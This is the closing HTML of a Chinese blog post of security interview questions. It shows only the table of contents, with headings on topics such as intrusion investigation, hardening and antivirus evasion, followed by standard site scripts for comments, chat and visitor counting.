class="toc-text">java执行代码的rce有过了解吗？类似php的eval</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%AF%A2%E9%97%AEjava%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E4%BA%86%E8%A7%A3%E7%A8%8B%E5%BA%A6"><span class="toc-number">61.</span> <span class="toc-text">询问java内存马的了解程度</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#windows%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5%E6%80%9D%E8%B7%AF"><span class="toc-number">62.</span> <span class="toc-text">windows入侵排查思路</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#linux%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5%E6%80%9D%E8%B7%AF"><span class="toc-number">63.</span> <span class="toc-text">linux入侵排查思路</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#linux%E5%8A%A0%E5%9B%BA%E6%80%9D%E8%B7%AF"><span class="toc-number">64.</span> <span class="toc-text">linux加固思路</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#windows%E5%8A%A0%E5%9B%BA"><span class="toc-number">65.</span> <span class="toc-text">windows加固</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#OSI%E4%B8%83%E5%B1%82%E6%A8%A1%E5%9E%8B%EF%BC%9F"><span class="toc-number">66.</span> <span class="toc-text">OSI七层模型？</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%89%E6%AC%A1%E6%8F%A1%E6%89%8B-x2F-%E5%9B%9B%E6%AC%A1%E6%8F%A1%E6%89%8B%EF%BC%9F"><span class="toc-number">67.</span> <span class="toc-text">三次握手&#x2F;四次握手？</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%85%8D%E6%9D%80%E6%9C%89%E4%BA%86%E8%A7%A3%E5%90%97%EF%BC%9F%E9%80%86%E5%90%91%E5%91%A2%EF%BC%9F%E9%92%93%E9%B1%BC%E5%91%A2%EF%BC%9F"><span class="toc-number">68.</span> <span class="toc-text">免杀有了解吗？逆向呢？钓鱼呢？</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%8B%E7%BB%8D"><span class="toc-number">68.1.</span> <span class="toc-text">介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9D%99%E6%80%81%E5%85%8D%E6%9D%80"><span class="toc-number">68.2.</span> <span class="toc-text">静态免杀</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%8E%E4%B9%88%E5%81%9A%E5%85%8D%E6%9D%80%EF%BC%9F"><span class="toc-number">69.</span> <span class="toc-text">怎么做免杀？</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#jsp%E5%85%8D%E6%9D%80"><span class="toc-number">70.</span> <span class="toc-text">jsp免杀</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-Dockerfile-%E5%AE%9A%E5%88%B6%E9%95%9C%E5%83%8F"><span class="toc-number">71.</span> <span class="toc-text">使用 Dockerfile 定制镜像</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#tcp%E4%B8%8Eudp%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-number">72.</span> <span class="toc-text">tcp与udp的区别</span></a></li></ol></div></div></div></div></main><footer id="footer" style="background: linear-gradient(20deg, #0062be, #925696, #cc426e, #fb0347)"><div id="footer-wrap"><div class="copyright">&copy;2021 - 2022 By wanan</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"></div><div id="rightside-config-show"><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="chat_btn" type="button" title="聊天"><i class="fas fa-sms"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module"></script><script>function panguFn () {
+  if (typeof pangu === 'object') pangu.autoSpacingPage()
+  else {
+    getScript('https://cdn.jsdelivr.net/npm/pangu/dist/browser/pangu.min.js')
+      .then(() => {
+        pangu.autoSpacingPage()
+      })
+  }
+}
+
+function panguInit () {
+  if (false){
+    GLOBAL_CONFIG_SITE.isPost && panguFn()
+  } else {
+    panguFn()
+  }
+}
+
+document.addEventListener('DOMContentLoaded', panguInit)</script><script src="/js/search/local-search.js"></script><div class="js-pjax"><script>function loadValine () {
+  function initValine () {
+    const valine = new Valine(Object.assign({
+      el: '#vcomment',
+      appId: 'RjFSSKpeg1lxuvDjmLndzaLO-MdYXbMMI',
+      appKey: '8qrAyIwMaJTebKjjzPnV0SFT',
+      avatar: 'monsterid',
+      serverURLs: 'https://valine.wanan.red',
+      emojiMaps: "",
+      path: window.location.pathname,
+      visitor: false
+    }, null))
+  }
+
+  if (typeof Valine === 'function') initValine() 
+  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
+}
+
+if ('Valine' === 'Valine' || !false) {
+  if (false) btf.loadComment(document.getElementById('vcomment'),loadValine)
+  else setTimeout(loadValine, 0)
+} else {
+  function loadOtherComment () {
+    loadValine()
+  }
+}</script><script>function loadDisqus () {
+  var disqus_config = function () {
+    this.page.url = 'https://www.wanan.red/%E5%85%B6%E4%BB%96/%E9%9D%A2%E8%AF%95%E9%A2%98%E7%9B%AE/%E5%85%B6%E4%BB%96/%E9%9D%A2%E8%AF%95/'
+    this.page.identifier = '/%E5%85%B6%E4%BB%96/%E9%9D%A2%E8%AF%95%E9%A2%98%E7%9B%AE/%E5%85%B6%E4%BB%96/%E9%9D%A2%E8%AF%95/'
+    this.page.title = '面试题目'
+  };
+
+  window.disqusReset = () => {
+    DISQUS.reset({
+      reload: true,
+      config: disqus_config
+    })
+  }
+
+  if (window.DISQUS) disqusReset()
+  else {
+    (function() { 
+      var d = document, s = d.createElement('script');
+      s.src = 'https://www-wanan-red.disqus.com/embed.js';
+      s.setAttribute('data-timestamp', +new Date());
+      (d.head || d.body).appendChild(s);
+    })();
+  }
+
+  document.getElementById('darkmode').addEventListener('click', () => {
+    setTimeout(() => window.disqusReset(), 200)
+  })
+}
+
+if ('Valine' === 'Disqus' || !false) {
+  if (false) btf.loadComment(document.getElementById('disqus_thread'), loadDisqus)
+  else loadDisqus()
+} else {
+  function loadOtherComment () {
+    loadDisqus()
+  }
+}
+</script></div><script>(function(d, w, c) {
+    w.ChatraID = 'LAbfxFAsFCbvYgjHY';
+    var s = d.createElement('script');
+    w[c] = w[c] || function() {
+        (w[c].q = w[c].q || []).push(arguments);
+    };
+    s.async = true;
+    s.src = 'https://call.chatra.io/chatra.js';
+    if (d.head) d.head.appendChild(s);
+})(document, window, 'Chatra');
+
+if (true) {
+  var chatBtnFn = () => {
+    var chatBtn = document.getElementById("chat_btn")
+    chatBtn.addEventListener("click", function(){
+      Chatra('openChat')
+    });
+  }
+  chatBtnFn()
+} else {
+  if (false) {
+    function chatBtnHide () {
+      Chatra('hide')
+    }
+    function chatBtnShow () {
+      Chatra('show')
+    }
+  }
+}</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
